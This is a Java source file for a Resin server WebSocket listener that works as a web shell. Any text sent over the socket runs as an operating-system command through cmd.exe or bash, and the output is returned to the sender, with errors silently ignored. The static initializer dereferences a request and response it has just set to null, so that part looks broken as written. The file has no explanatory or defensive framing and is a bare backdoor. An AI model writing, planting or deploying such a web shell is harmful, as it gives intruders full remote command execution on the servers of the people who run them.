import com.caucho.websocket.WebSocketListener;
import com.caucho.websocket.WebSocketServletRequest;
import com.caucho.websocket.WebSocketContext;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.Reader;
import java.io.PrintWriter;

public class CmdListener implements WebSocketListener {
    static {
        HttpServletRequest request = null;
        HttpServletResponse response=null;
        String protocol=request.getHeader("Upgrade");
        if(!"websocket".equals(protocol)){
            PrintWriter out = null;
            try {
                out = response.getWriter();
                out.println("not websocket");
                out.flush();
                out.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        WebSocketListener listener=new CmdListener();
        WebSocketServletRequest wsReq=(WebSocketServletRequest)request;
        try {
            wsReq.startWebSocket(listener);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public void onReadText(WebSocketContext context, Reader is) throws IOException {
        StringBuilder sb = new StringBuilder();
        int ch;
        while ((ch = is.read()) >= 0) {
            sb.append((char) ch);
        }
        try {
            Process process;
            boolean bool = System.getProperty("os.name").toLowerCase().startsWith("windows");
            if (bool) {
                process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", sb.toString()});
            } else {
                process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", sb.toString()});
            }
            InputStream inputStream = process.getInputStream();
            StringBuilder stringBuilder = new StringBuilder();
            int i;
            while ((i = inputStream.read()) != -1)
                stringBuilder.append((char) i);
            inputStream.close();
            process.waitFor();
            PrintWriter writer = context.startTextMessage();
            writer.print(stringBuilder);
            writer.close();
        } catch (Exception ignored) {
        }
    }

    public void onStart(WebSocketContext context) throws IOException {
    }

    public void onReadBinary(WebSocketContext context, InputStream is) throws IOException {
    }

    public void onClose(WebSocketContext context) throws IOException {
    }

    public void onDisconnect(WebSocketContext context) throws IOException {
    }

    public void onTimeout(WebSocketContext context) throws IOException {
    }
}
